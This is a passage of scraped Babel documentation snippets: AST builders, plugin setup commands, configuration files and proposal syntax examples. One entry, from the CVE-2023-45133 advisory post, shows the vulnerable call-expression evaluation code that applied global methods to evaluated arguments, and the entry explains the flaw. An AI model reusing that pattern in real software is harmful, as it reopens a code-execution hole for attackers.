JavaScript\nCODE:\n```\n// .eslintrc.js\nmodule.exports = {\n  parser: \"@babel/eslint-parser/experimental-worker\"\n};\n```\n\n----------------------------------------\n\nTITLE: Creating a UnaryExpression with Babel\nDESCRIPTION: Creates a `UnaryExpression` AST node using the `t.unaryExpression` method. This node represents a unary operation, where `operator` is the unary operator, `argument` is the expression to operate on, and `prefix` indicates if the operator is prefix (default `true`).\nSOURCE: https://github.com/babel/website/blob/main/docs/types.md#_snippet_242\n\nLANGUAGE: javascript\nCODE:\n```\nt.unaryExpression(operator, argument, prefix);\n```\n\n----------------------------------------\n\nTITLE: Using babel-plugin-transform-remove-console via CLI\nDESCRIPTION: Demonstrates how to use the babel-plugin-transform-remove-console via the Babel CLI.  It transforms a specified JavaScript file (script.js) using the plugin.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-transform-remove-console.md#_snippet_4\n\nLANGUAGE: Shell\nCODE:\n```\nbabel --plugins transform-remove-console script.js\n```\n\n----------------------------------------\n\nTITLE: Async Do Expression Example\nDESCRIPTION: This JavaScript code showcases the use of `async do` expressions, a Stage 1 proposal, which allows asynchronous blocks within synchronous functions. The example demonstrates how an asynchronous block can be evaluated as a promise within synchronous code.\nSOURCE: https://github.com/babel/website/blob/main/website/blog/2021-04-29-7.14.0.md#_snippet_6\n\nLANGUAGE: JavaScript\nCODE:\n```\nfunction sync() {\n  let x = async do {\n    let res = await Promise.resolve(\"Third!\");\n    console.log(\"Second!\");\n    res;\n  };\n  console.log(\"First!\");\n  x.then(console.log);\n}\n\nconsole.log(sync());\n// Logs:\n// - \"First!\"\n// - \"Second!\"\n// - \"Third!\"\n```\n\n----------------------------------------\n\nTITLE: ES7 Property Initializers in React\nDESCRIPTION: Shows how to use ES7 property initializers to define default props, prop types, and initial state within an ES6 class component.\nSOURCE: https://github.com/babel/website/blob/main/website/blog/2015-07-07-react-on-es6-plus.md#_snippet_6\n\nLANGUAGE: javascript\nCODE:\n```\n// The ES6+ way\nclass Video extends React.Component {\n  static defaultProps = {\n    autoPlay: false,\n    maxLoops: 10,\n  }\n  static propTypes = {\n    autoPlay: React.PropTypes.bool.isRequired,\n    maxLoops: React.PropTypes.number.isRequired,\n    posterFrameSrc: React.PropTypes.string.isRequired,\n    videoSrc: React.PropTypes.string.isRequired,\n  }\n  state = {\n    loopsRemaining: this.props.maxLoops,\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: ES5 Property Mutators to ES5 defineProperties Output (JavaScript)\nDESCRIPTION: This is the output of the property mutators transform. It shows how a `get` and `set` are converted to equivalent Object.defineProperties calls.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-transform-property-mutators.md#_snippet_1\n\nLANGUAGE: JavaScript\nCODE:\n```\nvar foo = Object.defineProperties(\n  {},\n  {\n    bar: {\n      get: function() {\n        return this._bar;\n      },\n      set: function(value) {\n        this._bar = value;\n      },\n      configurable: true,\n      enumerable: true,\n    },\n  }\n);\n```\n\n----------------------------------------\n\nTITLE: Creating ExportNamespaceSpecifier in JavaScript\nDESCRIPTION: This snippet shows how to create an `ExportNamespaceSpecifier` AST node using Babel's `t.exportNamespaceSpecifier` method. The `exported` parameter is required and should be an `Identifier` node. This represents `export * as exported from 'module';`\nSOURCE: https://github.com/babel/website/blob/main/docs/types.md#_snippet_65\n\nLANGUAGE: JavaScript\nCODE:\n```\nt.exportNamespaceSpecifier(exported);\n```\n\n----------------------------------------\n\nTITLE: Use babel-plugin-minify-simplify via Node API - JavaScript\nDESCRIPTION: This code snippet demonstrates how to use the `minify-simplify` plugin programmatically using the Babel Node API. It transforms the string \"code\" using the plugin and returns the transformed code.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-minify-simplify.md#_snippet_5\n\nLANGUAGE: JavaScript\nCODE:\n```\nrequire(\"@babel/core\").transformSync(\"code\", {\n  plugins: [\"minify-simplify\"]\n});\n```\n\n----------------------------------------\n\nTITLE: String Named Exports in Babel\nDESCRIPTION: This snippet showcases support for string named exports, enabling the use of strings (including emojis) as export names. This feature is useful for creating more descriptive and expressive module interfaces. It relies on Babel's support for this specific ECMAScript proposal.\nSOURCE: https://github.com/babel/website/blob/main/docs/features-timeline.md#_snippet_1\n\nLANGUAGE: JavaScript\nCODE:\n```\nlet happy = \"wooo!\";\nexport { happy as \"😃\" };\n```\n\n----------------------------------------\n\nTITLE: Create Function Expression AST Node (JavaScript)\nDESCRIPTION: Creates a `FunctionExpression` AST node using the `t.functionExpression` builder. This node represents a function expression. Parameters include the function identifier, parameters, body, and boolean flags for generator and async functions.\nSOURCE: https://github.com/babel/website/blob/main/docs/types.md#_snippet_73\n\nLANGUAGE: JavaScript\nCODE:\n```\nt.functionExpression(id, params, body, generator, async);\n```\n\n----------------------------------------\n\nTITLE: Install Babel Plugin via npm\nDESCRIPTION: Installs the @babel/plugin-transform-regexp-modifiers plugin as a development dependency using npm.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-transform-regexp-modifiers.md#_snippet_5\n\nLANGUAGE: shell\nCODE:\n```\nnpm install --save-dev @babel/plugin-transform-regexp-modifiers\n```\n\n----------------------------------------\n\nTITLE: Import with deprecated assert keyword JavaScript\nDESCRIPTION: This JavaScript snippet demonstrates the import attributes syntax using the deprecated `assert` keyword. This is enabled by setting the `deprecatedAssertSyntax` option to `true`.  It imports a module with specific attributes, specifying the type of the imported resource.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-syntax-import-attributes.md#_snippet_6\n\nLANGUAGE: JavaScript\nCODE:\n```\nimport foo from \"./foo.json\" assert { type: \"json\" };\n```\n\n----------------------------------------\n\nTITLE: Filter Items Example JavaScript\nDESCRIPTION: Demonstrates how to use the `filterItems` function to determine the required plugins based on different browser targets and include/exclude options. It uses a sample compatibility data object and shows various filtering scenarios.\nSOURCE: https://github.com/babel/website/blob/main/docs/helper-compilation-targets.md#_snippet_1\n\nLANGUAGE: JavaScript\nCODE:\n```\nconst compatData = {\n  \"transform-feature-1\": {\n    chrome: \"1\",\n    firefox: \"1\",\n  },\n  \"transform-feature-2\": {\n    chrome: \"2\",\n    firefox: \"2\",\n  },\n  \"transform-feature-3\": {\n    chrome: \"3\",\n    firefox: \"3\",\n  },\n  \"transform-feature-4\": {\n    chrome: \"4\",\n    firefox: \"4\",\n  },\n};\n\n// filter a set of plugins required when compiled to chrome 2\n// returns new Set([\"transform-feature-3\", \"transform-feature-4\"])\nfilterItems(compatData, new Set(), new Set(), {\n  chrome: 2,\n});\n\n// filter a set of plugins required when compiled to chrome 2 and firefox 1\n// returns new Set([\"transform-feature-2\", \"transform-feature-3\", \"transform-feature-4\"])\nfilterItems(compatData, new Set(), new Set(), {\n  chrome: 2,\n  firefox: 1,\n});\n\n// always include \"transform-feature-2\" and exclude \"transform-feature-4\"\n// returns new Set([\"transform-feature-2\", \"transform-feature-3\"])\nfilterItems(\n  compatData,\n  new Set([\"transform-feature-2\"]),\n  new Set([\"transform-feature-4\"]),\n  {\n    chrome: 2,\n  }\n);\n\n// syntax-feature-2 is required to allow older @babel/parser to parse\n// the feature-2 syntax supported in chrome 2\n\n// returns new Set([\"syntax-feature-2\", \"transform-feature-3\", \"transform-feature-4\"])\nfilterItems(\n  compatData,\n  new Set(),\n  new Set(),\n  {\n    chrome: 2,\n  },\n  null,\n  null,\n  new Map([[\"transform-feature-2\", \"syntax-feature-2\"]])\n);\n```\n\n----------------------------------------\n\nTITLE: CLI Usage\nDESCRIPTION: This shell command demonstrates how to use the Babel CLI to transform a file using the plugin. It specifies the plugin using the `--plugins` flag.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-transform-async-generator-functions.md#_snippet_6\n\nLANGUAGE: Shell\nCODE:\n```\nbabel --plugins @babel/plugin-transform-async-generator-functions script.js\n```\n\n----------------------------------------\n\nTITLE: Optional Chaining (JavaScript)\nDESCRIPTION: This JavaScript code utilizes the optional chaining operator.  The `pureGetters` assumption tells Babel that getters, if present, don't have side-effects and can be accessed multiple times.\nSOURCE: https://github.com/babel/website/blob/main/docs/assumptions.md#_snippet_17\n\nLANGUAGE: JavaScript\nCODE:\n```\nlet a = obj;\n\na.b?.();\n```\n\n----------------------------------------\n\nTITLE: Tail Call Optimization in JavaScript\nDESCRIPTION: Illustrates tail call optimization with a factorial function. The function uses strict mode and a base case to terminate recursion.  The recursive call is in the tail position, ensuring proper tail call optimization. The example shows a factorial computation, which would normally overflow the stack but remains safe with tail call optimization.\nSOURCE: https://github.com/babel/website/blob/main/docs/learn.md#_snippet_33\n\nLANGUAGE: JavaScript\nCODE:\n```\nfunction factorial(n, acc = 1) {\n    \"use strict\";\n    if (n <= 1) return acc;\n    return factorial(n - 1, n * acc);\n}\n\n// Stack overflow in most implementations today,\n// but safe on arbitrary inputs in ES2015\nfactorial(100000)\n```\n\n----------------------------------------\n\nTITLE: Checking for FlowBaseAnnotation Nodes in JavaScript\nDESCRIPTION: This code snippet demonstrates how to check if a given AST node is a FlowBaseAnnotation node using the `t.isFlowBaseAnnotation(node)` method in Babel. It covers primary Flow type annotations like AnyTypeAnnotation, BooleanTypeAnnotation, and StringTypeAnnotation. This method is used to identify fundamental type annotations in Flow.\nSOURCE: https://github.com/babel/website/blob/main/docs/types.md#_snippet_267\n\nLANGUAGE: JavaScript\nCODE:\n```\nt.isFlowBaseAnnotation(node);\n```\n\n----------------------------------------\n\nTITLE: Use plugin via CLI Shell\nDESCRIPTION: This command demonstrates how to use the `@babel/plugin-syntax-async-generators` plugin via the Babel CLI to process a JavaScript file named `script.js`.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-syntax-async-generators.md#_snippet_4\n\nLANGUAGE: Shell\nCODE:\n```\nbabel --plugins @babel/plugin-syntax-async-generators script.js\n```\n\n----------------------------------------\n\nTITLE: Inline Elements Usage with Babel CLI Shell\nDESCRIPTION: Shows how to enable the `inlineElements` optimization for React in Babel using the command-line interface (CLI) with the `--optional` flag. Emphasizes that this optimization is suitable only for production builds.\nSOURCE: https://github.com/babel/website/blob/main/website/blog/2015-03-31-5.0.0.md#_snippet_14\n\nLANGUAGE: Shell\nCODE:\n```\n$ babel --optional optimisation.react.inlineElements script.js\n```\n\n----------------------------------------\n\nTITLE: Babel Configuration with async-do-expressions Plugin\nDESCRIPTION: This JSON configuration file demonstrates how to enable the `@babel/plugin-proposal-async-do-expressions` plugin in your Babel configuration.  This enables Babel to transform `async do` expressions.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-proposal-async-do-expressions.md#_snippet_3\n\nLANGUAGE: JSON\nCODE:\n```\n{\n  \"plugins\": [\"@babel/plugin-proposal-async-do-expressions\"]\n}\n```\n\n----------------------------------------\n\nTITLE: Installing @babel/plugin-syntax-typescript\nDESCRIPTION: This command installs the @babel/plugin-syntax-typescript plugin as a development dependency using npm or yarn. This plugin only enables Babel to parse TypeScript syntax.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-syntax-typescript.md#_snippet_0\n\nLANGUAGE: shell\nCODE:\n```\nnpm install --save-dev @babel/plugin-syntax-typescript\n```\n\n----------------------------------------\n\nTITLE: Creating a TSUnionType Node in JavaScript\nDESCRIPTION: This snippet demonstrates how to create a `TSUnionType` AST node using Babel's `t.tsUnionType` method. It takes an array of `TSType` nodes representing the types that make up the union.\nSOURCE: https://github.com/babel/website/blob/main/docs/types.md#_snippet_222\n\nLANGUAGE: JavaScript\nCODE:\n```\nt.tsUnionType(types);\n```\n\n----------------------------------------\n\nTITLE: JSX Fragment Usage\nDESCRIPTION: This JSX code snippet demonstrates the use of JSX fragments (`<>`) to return multiple elements without adding an extra DOM node. It includes `<ChildA />` and `<ChildB />` components within the fragment.\nSOURCE: https://github.com/babel/website/blob/main/website/blog/2018-08-27-7.0.0.md#_snippet_12\n\nLANGUAGE: JSX\nCODE:\n```\nrender() {\n  return (\n    <>\n      <ChildA />\n      <ChildB />\n    </>\n  );\n}\n```\n\n----------------------------------------\n\nTITLE: Nullish Coalescing and Optional Chaining (JavaScript)\nDESCRIPTION: This JavaScript code uses nullish coalescing and optional chaining operators. The `noDocumentAll` assumption informs Babel that these operators are never used with the special value `document.all`.\nSOURCE: https://github.com/babel/website/blob/main/docs/assumptions.md#_snippet_10\n\nLANGUAGE: JavaScript\nCODE:\n```\nlet score = points ?? 0;\nlet name = user?.name;\n```\n\n----------------------------------------\n\nTITLE: Transform Block-Scoped Function (JavaScript)\nDESCRIPTION: This example demonstrates how the plugin transforms a block-scoped function declaration. The function 'name' declared inside the block is converted to a let variable assigned to an anonymous function, maintaining its scope.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-transform-block-scoped-functions.md#_snippet_0\n\nLANGUAGE: JavaScript\nCODE:\n```\n{\n  function name(n) {\n    return n;\n  }\n}\n\nname(\"Steve\");\n```\n\nLANGUAGE: JavaScript\nCODE:\n```\n{\n  let name = function(n) {\n    return n;\n  };\n}\nname(\"Steve\");\n```\n\n----------------------------------------\n\nTITLE: Transformed `using` declarations (Output)\nDESCRIPTION: This code snippet shows the output of the Babel plugin, demonstrating how the `using` declarations are transformed into a try...catch...finally block using Babel helper functions.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-proposal-explicit-resource-management.md#_snippet_1\n\nLANGUAGE: JavaScript\nCODE:\n```\ntry {\n  var _stack = [];\n  var handlerSync = babelHelpers.using(_stack, openSync());\n  var handlerAsync = babelHelpers.using(_stack, await openAsync(), true);\n} catch (_) {\n  var _error = _;\n  var _hasError = true;\n} finally {\n  await babelHelpers.dispose(_stack, _error, _hasError);\n}\n```\n\n----------------------------------------\n\nTITLE: Installing the Env Preset\nDESCRIPTION: Installs the `babel-preset-env` preset as a development dependency using npm. This preset dynamically determines which transformations to apply based on the target environment.\nSOURCE: https://github.com/babel/website/blob/main/website/blog/2015-10-31-setting-up-babel-6.md#_snippet_7\n\nLANGUAGE: Shell\nCODE:\n```\n$ npm install --save-dev babel-preset-env\n```\n\n----------------------------------------\n\nTITLE: JavaScript Example Input\nDESCRIPTION: This code snippet shows an example of JavaScript code before transformation by the @babel/plugin-transform-jscript plugin. It defines a function expression assigned to a variable.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-transform-jscript.md#_snippet_0\n\nLANGUAGE: JavaScript\nCODE:\n```\nvar foo = function bar() {};\n```\n\n----------------------------------------\n\nTITLE: Use Plugin with Node API\nDESCRIPTION: This JavaScript snippet shows how to use the Babel Node API to transform code with the plugin. The `transformSync` function takes the code to transform and an options object, which includes the plugins to use.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-syntax-unicode-sets-regex.md#_snippet_4\n\nLANGUAGE: JavaScript\nCODE:\n```\nrequire(\"@babel/core\").transformSync(\"code\", {\n  plugins: [\"@babel/plugin-syntax-unicode-sets-regex\"],\n});\n```\n\n----------------------------------------\n\nTITLE: Configure Plugin in babel.config.json JSON\nDESCRIPTION: This JSON configuration shows how to enable the `@babel/plugin-proposal-function-sent` plugin within a `babel.config.json` file.  Adding the plugin to the `plugins` array ensures that it is applied during the Babel transformation process.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-proposal-function-sent.md#_snippet_3\n\nLANGUAGE: JSON\nCODE:\n```\n{\n  \"plugins\": [\"@babel/plugin-proposal-function-sent\"]\n}\n```\n\n----------------------------------------\n\nTITLE: Using Top-Level Await in JavaScript\nDESCRIPTION: This code snippet demonstrates the use of top-level await in a JavaScript module. It conditionally imports a dependency and performs resource initialization using await outside of an async function. This requires support from the module bundler.\nSOURCE: https://github.com/babel/website/blob/main/website/blog/2019-11-05-7.7.0.md#_snippet_0\n\nLANGUAGE: JavaScript\nCODE:\n```\n// Dynamic dependency path\nconst strings = await import(`./i18n/${navigator.language}.mjs`);\n\n// Resource initialization\nconst connection = await dbConnector();\n```\n\n----------------------------------------\n\nTITLE: Using Babel Plugin External Helpers via Node API\nDESCRIPTION: This JavaScript code snippet demonstrates how to use the Babel Node API to transform code with the `@babel/plugin-external-helpers` plugin. It imports `@babel/core` and uses the `transformSync` method to apply the plugin to the input code.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-external-helpers.md#_snippet_3\n\nLANGUAGE: javascript\nCODE:\n```\nrequire(\"@babel/core\").transformSync(\"code\", {\n  plugins: [\"@babel/plugin-external-helpers\"]\n});\n```\n\n----------------------------------------\n\nTITLE: SystemJS Output\nDESCRIPTION: Shows the output of the Babel plugin when transforming an ES module to SystemJS format.  The `System.register` function defines the module, including setters for dependencies and an execute function that performs the export. This specific example shows how a default export is handled.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-transform-modules-systemjs.md#_snippet_1\n\nLANGUAGE: JavaScript\nCODE:\n```\nSystem.register([], function(_export, _context) {\n  return {\n    setters: [],\n    execute: function() {\n      _export(\"default\", 42);\n    },\n  };\n});\n```\n\n----------------------------------------\n\nTITLE: Using Babel Plugin via Node API\nDESCRIPTION: Transforms JavaScript code using the Babel Node API with the specified plugin. The transformSync method is used to synchronously transform the 'code' string with the @babel/plugin-syntax-numeric-separator plugin, enabling parsing of numeric separators.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-syntax-numeric-separator.md#_snippet_3\n\nLANGUAGE: javascript\nCODE:\n```\nrequire(\"@babel/core\").transformSync(\"code\", {\n  plugins: [\"@babel/plugin-syntax-numeric-separator\"]\n});\n```\n\n----------------------------------------\n\nTITLE: Using Numeric Separators in Decimal Literals (JavaScript)\nDESCRIPTION: This JavaScript code demonstrates the use of numeric separators in decimal literals to improve readability. It assigns a large number with separators to a variable and confirms its value using comparison.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-transform-numeric-separator.md#_snippet_0\n\nLANGUAGE: JavaScript\nCODE:\n```\nlet budget = 1_000_000_000_000;\n\n// What is the value of `budget`? It's 1 trillion!\n//\n// Let's confirm:\nconsole.log(budget === 10 ** 12); // true\n```\n\n----------------------------------------\n\nTITLE: Creating JSX Closing Element in JavaScript\nDESCRIPTION: This snippet creates a `JSXClosingElement` AST node using Babel's `t.jsxClosingElement` builder. The `name` parameter is a `JSXIdentifier`, `JSXMemberExpression`, or `JSXNamespacedName`.\nSOURCE: https://github.com/babel/website/blob/main/docs/types.md#_snippet_94\n\nLANGUAGE: JavaScript\nCODE:\n```\nt.jsxClosingElement(name);\n```\n\n----------------------------------------\n\nTITLE: Install Babel Plugin\nDESCRIPTION: This shell command installs the `@babel/plugin-proposal-import-wasm-source` plugin as a development dependency using npm.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-proposal-import-wasm-source.md#_snippet_4\n\nLANGUAGE: shell\nCODE:\n```\nnpm install --save-dev @babel/plugin-proposal-import-wasm-source\n```\n\n----------------------------------------\n\nTITLE: TSTypeQuery ExprName Update (TypeScript)\nDESCRIPTION: This example showcases the change in TSTypeQuery.exprName.  In Babel 7 it was an Identifier with the name `this`, but in Babel 8 it is a ThisExpression. This relates to how `typeof this` is parsed. The input is a TypeScript function using `typeof this`.\nSOURCE: https://github.com/babel/website/blob/main/docs/v8-migration-api.md#_snippet_5\n\nLANGUAGE: typescript\nCODE:\n```\nfunction fn() {\n  // `typeof this` is a TSTypeQuery\n  var self: typeof this\n}\n```\n\n----------------------------------------\n\nTITLE: Decorator Example in JavaScript\nDESCRIPTION: This code snippet demonstrates the usage of decorators in JavaScript. Decorators are used to modify the behavior of classes and methods. In this example, decorators like `@frozen`, `@configurable`, `@enumerable`, and `@throttle` are applied to the `Foo` class and its methods to alter their properties and behavior.\nSOURCE: https://github.com/babel/website/blob/main/website/blog/2017-08-11-gsoc-peey-1.md#_snippet_0\n\nLANGUAGE: JavaScript\nCODE:\n```\n@frozen class Foo {\n  @configurable(false)\n  @enumerable(true)\n  method() {}\n\n  @throttle(500)\n  expensiveMethod() {}\n}\n```\n\n----------------------------------------\n\nTITLE: Partial Application Example JavaScript\nDESCRIPTION: Demonstrates the usage of the partial application proposal with the `divide` function and event listener handling. This feature allows binding arguments and the `this` receiver function, reducing the need for arrow functions.\nSOURCE: https://github.com/babel/website/blob/main/website/blog/2019-03-19-7.4.0.md#_snippet_5\n\nLANGUAGE: JavaScript\nCODE:\n```\nconst half = divide(?, 2); // half = num => divide(num, 3)\nhalf(6); // 3\n\n\nelement.addEventListener(\n  \"click\",\n  // handleEvent will be called with the correct \"this\".\n  this.handleEvent(\"click\", ?) // e => this.handleEvent(\"click\", e)\n);\n```\n\n----------------------------------------\n\nTITLE: Call Expression Handling in Babel (TypeScript)\nDESCRIPTION: This code snippet shows how Babel handles call expressions, specifically when the callee is an identifier or a member expression. It checks if the object and property are whitelisted and not blacklisted before evaluating the expression. The snippet includes the context extraction and function application, highlighting the vulnerability related to whitelisted methods of global objects.\nSOURCE: https://github.com/babel/website/blob/main/website/blog/2023-10-16-cve-2023-45133.md#_snippet_2\n\nLANGUAGE: typescript\nCODE:\n```\nif (\n  object.isIdentifier() &&\n  property.isIdentifier() &&\n  isValidObjectCallee(object.node.name) &&\n  !isInvalidMethod(property.node.name)\n) {\n  context = global[object.node.name];\n  // @ts-expect-error property may not exist in context object\n  func = context[property.node.name];\n}\n\n/** snip **/\nif (func) {\n  const args = path.get(\"arguments\").map((arg) => evaluateCached(arg, state));\n  if (!state.confident) return;\n\n  return func.apply(context, args);\n}\n```\n\n----------------------------------------\n\nTITLE: Use plugin via Node API JavaScript\nDESCRIPTION: This JavaScript code snippet demonstrates how to use the `@babel/plugin-transform-instanceof` plugin programmatically via the Node API. It uses `require(\"@babel/core\").transformSync` to transform the provided code string with the specified plugin.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-transform-instanceof.md#_snippet_5\n\nLANGUAGE: JavaScript\nCODE:\n```\nrequire(\"@babel/core\").transformSync(\"code\", {\n  plugins: [\"@babel/plugin-transform-instanceof\"],\n});\n```\n\n----------------------------------------\n\nTITLE: Use Babel Plugin via Node API - JavaScript\nDESCRIPTION: This snippet demonstrates how to use the @babel/plugin-transform-typeof-symbol plugin programmatically using the Node API. It transforms the string 'code' using the `transformSync` method with the specified plugin.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-transform-typeof-symbol.md#_snippet_5\n\nLANGUAGE: JavaScript\nCODE:\n```\nrequire(\"@babel/core\").transformSync(\"code\", {\n  plugins: [\"@babel/plugin-transform-typeof-symbol\"],\n});\n```\n\n----------------------------------------\n\nTITLE: Checking feature support using isRequired utility in JavaScript\nDESCRIPTION: This JavaScript code snippet demonstrates how to use the isRequired utility from @babel/helper-compilation-targets to check if a specific feature (transform-object-rest-spread) is supported in the specified compilation targets. The utility returns true if the feature is required (not natively supported), and false otherwise.\nSOURCE: https://github.com/babel/website/blob/main/docs/compat-data.md#_snippet_3\n\nLANGUAGE: JavaScript\nCODE:\n```\nimport { isRequired } from \"@babel/helper-compilation-targets\";\n\nmodule.exports = api => {\n  // Check if the targets have native object-rest-spread support\n  const objectRestSpreadSupported = !isRequired(\n    \"transform-object-rest-spread\",\n    api.targets()\n  );\n};\n```\n\n----------------------------------------\n\nTITLE: Using the Plugin via CLI\nDESCRIPTION: Demonstrates how to use the Babel plugin via the command-line interface (CLI). It transforms a JavaScript file (script.js) using the specified plugin.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-bugfix-v8-spread-parameters-in-optional-chaining.md#_snippet_2\n\nLANGUAGE: shell\nCODE:\n```\nbabel --plugins @babel/plugin-bugfix-v8-spread-parameters-in-optional-chaining script.js\n```\n\n----------------------------------------\n\nTITLE: Creating an ObjectTypeAnnotation in JavaScript\nDESCRIPTION: This code snippet demonstrates creating an `ObjectTypeAnnotation` AST node using `t.objectTypeAnnotation(properties, indexers, callProperties, internalSlots, exact)`. It represents an object type annotation in Flow.  Parameters include arrays of properties, indexers, call properties, internal slots, and a flag for exact types.\nSOURCE: https://github.com/babel/website/blob/main/docs/types.md#_snippet_126\n\nLANGUAGE: JavaScript\nCODE:\n```\nt.objectTypeAnnotation(properties, indexers, callProperties, internalSlots, exact);\n```\n\n----------------------------------------\n\nTITLE: Creating a Spread Element Node in Babel\nDESCRIPTION: Creates a `SpreadElement` AST node using the Babel types module. This node represents a spread element, requiring an expression argument.\nSOURCE: https://github.com/babel/website/blob/main/docs/types.md#_snippet_149\n\nLANGUAGE: JavaScript\nCODE:\n```\nt.spreadElement(argument);\n```\n\n----------------------------------------\n\nTITLE: hoistVariables Function Declaration\nDESCRIPTION: TypeScript declaration for the hoistVariables function. This function takes a NodePath, an EmitFunction, and an optional kind parameter to hoist variables within a given scope. Default kind is 'var'.\nSOURCE: https://github.com/babel/website/blob/main/docs/helper-hoist-variables.md#_snippet_2\n\nLANGUAGE: typescript\nCODE:\n```\ndeclare export default hoistVariables(path: NodePath, emit: EmitFunction, kind: \"var\" | \"let\" = \"var\");\n```\n\n----------------------------------------\n\nTITLE: ES6 Class Definition in JavaScript\nDESCRIPTION: This JavaScript code defines a simple ES6 class `C` with a method `m`. This is used to demonstrate the addition of the `/*#__PURE__*/` annotation by Babel.\nSOURCE: https://github.com/babel/website/blob/main/website/blog/2018-08-27-7.0.0.md#_snippet_8\n\nLANGUAGE: JavaScript\nCODE:\n```\nclass C {\n  m() {}\n}\n```\n\n----------------------------------------\n\nTITLE: MemberExpression Optional Argument Removal Diff\nDESCRIPTION: This diff shows the removal of the `optional` argument from `t.memberExpression` in Babel 8, suggesting it can be safely removed.\nSOURCE: https://github.com/babel/website/blob/main/docs/v8-migration-api.md#_snippet_65\n\nLANGUAGE: diff\nCODE:\n```\n- t.memberExpression(object, property, computed, optional?: boolean)\n+ t.memberExpression(object, property, computed)\n```\n\n----------------------------------------\n\nTITLE: Binary Expression Example JavaScript\nDESCRIPTION: This JavaScript code illustrates how Flow's `all` option affects parsing. Without `@flow` pragma or the `all` option, a call expression with a type argument is parsed as a nested binary expression: `f < T > e;`.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-transform-flow-strip-types.md#_snippet_6\n\nLANGUAGE: JavaScript\nCODE:\n```\nf < T > e;\n```\n\n----------------------------------------\n\nTITLE: Shell: Wrap Legacy Decorators\nDESCRIPTION: This command uses `wrap-legacy-decorators` to upgrade files with legacy decorators. It also uses the `--decorators-before-export` and `--write` flags.\nSOURCE: https://github.com/babel/website/blob/main/website/blog/2018-09-17-decorators.md#_snippet_3\n\nLANGUAGE: Shell\nCODE:\n```\nnpx wrap-legacy-decorators src/file-with-decorators.js --decorators-before-export --write\n```\n\n----------------------------------------\n\nTITLE: Using Babel Preset ES2016 with Configuration File\nDESCRIPTION: Configures Babel to use the @babel/preset-es2016 preset by specifying it in the presets array within the babel.config.json file. This approach is the recommended way to use Babel presets.\nSOURCE: https://github.com/babel/website/blob/main/docs/preset-es2016.md#_snippet_1\n\nLANGUAGE: json\nCODE:\n```\n{\n  \"presets\": [\"@babel/preset-es2016\"]\n}\n```\n\n----------------------------------------\n\nTITLE: Create TypeScript Module Block\nDESCRIPTION: Creates a TypeScript module block node in the AST. Represents the body of a TypeScript module or namespace. Requires an array of statement nodes as the body of the block.\nSOURCE: https://github.com/babel/website/blob/main/docs/types.md#_snippet_189\n\nLANGUAGE: JavaScript\nCODE:\n```\nt.tsModuleBlock(body);\n```\n\n----------------------------------------\n\nTITLE: F# Pipeline with Async/Await (Desugared)\nDESCRIPTION: This JavaScript snippet shows the desugared form of the F# pipeline `await` example. It demonstrates that `promise |> await` becomes `await promise`.\nSOURCE: https://github.com/babel/website/blob/main/website/blog/2018-07-19-whats-happening-with-the-pipeline-proposal.md#_snippet_6\n\nLANGUAGE: javascript\nCODE:\n```\nawait promise\n```\n\n----------------------------------------\n\nTITLE: Configure Babel Presets with no targets in JSON\nDESCRIPTION: This JSON snippet demonstrates how to configure Babel to use the `@babel/preset-env` preset without specifying any targets. This will cause Babel to assume that you are targeting the oldest browsers possible in Babel 7. In Babel 8 this would default to browserslist defaults query.\nSOURCE: https://github.com/babel/website/blob/main/docs/options.md#_snippet_7\n\nLANGUAGE: json\nCODE:\n```\n{\n  \"presets\": [\"@babel/preset-env\"]\n}\n```\n\n----------------------------------------\n\nTITLE: Creating Null Literal Type Annotation in JavaScript\nDESCRIPTION: This snippet creates a `NullLiteralTypeAnnotation` AST node using Babel's `t.nullLiteralTypeAnnotation` builder. It takes no parameters.\nSOURCE: https://github.com/babel/website/blob/main/docs/types.md#_snippet_117\n\nLANGUAGE: JavaScript\nCODE:\n```\nt.nullLiteralTypeAnnotation();\n```\n\n----------------------------------------\n\nTITLE: Exporting Module Members JavaScript\nDESCRIPTION: This code snippet demonstrates how to export named functions and variables from a module using the `export` keyword.  It exports a `sum` function and a `pi` variable. It requires no external dependencies. The output is that `sum` and `pi` are available for import in other modules.\nSOURCE: https://github.com/babel/website/blob/main/docs/learn.md#_snippet_12\n\nLANGUAGE: JavaScript\nCODE:\n```\n// lib/math.js\nexport function sum(x, y) {\n  return x + y;\n}\nexport var pi = 3.141593;\n```\n\n----------------------------------------\n\nTITLE: Configure Babel Plugin in babel.config.json\nDESCRIPTION: This JSON snippet shows how to configure the babel-plugin-minify-builtins plugin within a babel.config.json file.  The \"plugins\" array is used to specify the plugins that Babel should use during the transformation process.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-minify-builtins.md#_snippet_2\n\nLANGUAGE: JSON\nCODE:\n```\n{\n  \"plugins\": [\"minify-builtins\"]\n}\n```\n\n----------------------------------------\n\nTITLE: Creating a BreakStatement Node\nDESCRIPTION: Creates an AST node representing a break statement. Accepts an optional `label` parameter, which is an `Identifier`. Use `t.isBreakStatement(node, opts)` to check if a node is a BreakStatement and `t.assertBreakStatement(node, opts)` to assert that a node is a BreakStatement.\nSOURCE: https://github.com/babel/website/blob/main/docs/types.md#_snippet_17\n\nLANGUAGE: JavaScript\nCODE:\n```\nt.breakStatement(label);\n```\n\n----------------------------------------\n\nTITLE: 